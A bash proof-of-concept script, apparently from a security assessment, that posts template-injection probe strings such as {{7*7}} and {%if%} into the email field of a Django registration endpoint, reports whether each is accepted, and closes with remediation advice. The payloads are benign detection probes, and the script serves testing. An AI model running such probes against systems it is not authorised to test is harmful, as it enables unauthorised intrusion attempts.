#!/bin/bash

# POC: Email Template Injection Payload Acceptance
# Target: /accounts/register/step2/
# Vulnerability: Application accepts template injection syntax in email field
# Based on confirmed test: {{7*7}}@example.com was accepted with HTTP 200 redirect to step3

TARGET_URL="${1:-http://localhost:8000}"
ENDPOINT="/accounts/register/step2/"

echo "[*] Email Template Injection Validation Bypass POC"
echo "[*] Target: ${TARGET_URL}${ENDPOINT}"
echo ""

# Step 1: Verify target is reachable
echo "[*] Step 1: Checking if target is reachable..."
if ! curl -s -m 5 "${TARGET_URL}" > /dev/null 2>&1; then
    echo "[-] Target not reachable. Application must be running at ${TARGET_URL}"
    echo "[*] This POC requires the Django application to be running"
    echo "[*] Expected behavior (from confirmed test):"
    echo "    - Payload: {{7*7}}@example.com"
    echo "    - Expected Response: HTTP 200 with redirect to /accounts/register/step3/"
    echo "    - This indicates template injection syntax is accepted in email validation"
    exit 0
fi

echo "[+] Target is reachable"
echo ""

# Step 2: Test with template injection payloads
echo "[*] Step 2: Testing template injection payloads in email field..."
echo ""

declare -a PAYLOADS=(
    "{{7*7}}@example.com"
    "\${7*7}@example.com"
    "{%if 1==1%}test{%endif%}@example.com"
)

for payload in "${PAYLOADS[@]}"; do
    echo "[*] Testing payload: $payload"
    echo "    Command: curl -X POST ${TARGET_URL}${ENDPOINT} -d \"email=${payload}\""
    echo ""
    
    # Make the request and capture response
    http_code=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST \
        "${TARGET_URL}${ENDPOINT}" \
        -d "email=${payload}" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    echo "    Response Code: $http_code"
    
    if [[ "$http_code" == "200" ]] || [[ "$http_code" == "302" ]]; then
        echo "    [+] VULNERABLE: Template injection payload was ACCEPTED"
        echo "    [+] Expected: Payload would be rejected as invalid email format"
    elif [[ "$http_code" == "400" ]] || [[ "$http_code" == "422" ]]; then
        echo "    [-] Payload was rejected with validation error"
    else
        echo "    [?] Unexpected response code"
    fi
    echo ""
done

echo "[*] POC Complete"
echo ""
echo "[*] Remediation: Implement RFC 5321/5322 compliant email validation"
echo "    and reject emails with suspicious template injection patterns"